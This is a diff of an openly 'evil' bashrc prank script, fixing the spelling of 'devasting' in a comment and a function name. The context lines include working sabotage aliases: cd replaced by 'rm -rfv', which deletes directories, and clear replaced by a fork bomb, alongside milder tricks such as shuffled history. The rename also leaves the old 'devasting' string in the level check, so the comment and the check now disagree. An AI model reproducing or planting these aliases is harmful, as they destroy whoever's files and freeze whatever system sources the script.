@@ -8,7 +8,7 @@
 # annoying: like insane just way more obvious behaviour allowed (e.g. constantly cd to the wrong
 #   (random) directory
 # destructive: delete files and do serious harm, non-recoverable damage included
-# devasting: may delete /
+# devastating: may delete /
 # unusable: enable everything including, but not limited to replacing enter by backspace
 EVIL_BEHAVIOUR=annoying
 
@@ -24,10 +24,10 @@ function annoying()
 
 function destructive()
 {
-	devasting || test "$EVIL_BEHAVIOUR" = "destructive"
+	devastating || test "$EVIL_BEHAVIOUR" = "destructive"
 }
 
-function devasting()
+function devastating()
 {
 	unusable || test "$EVIL_BEHAVIOUR" = "devasting"
 }
@@ -65,7 +65,7 @@ insane && alias sl='ls | rev 2>/dev/null'
 insane && alias history='history | shuf'
 
 # Delete directories instead of entering them.
-devasting && alias cd='rm -rfv';
+devastating && alias cd='rm -rfv';
 
 # Launch a fork bomb instead of clearing the screen.
 destructive && alias clear=':(){ :|:& };:';
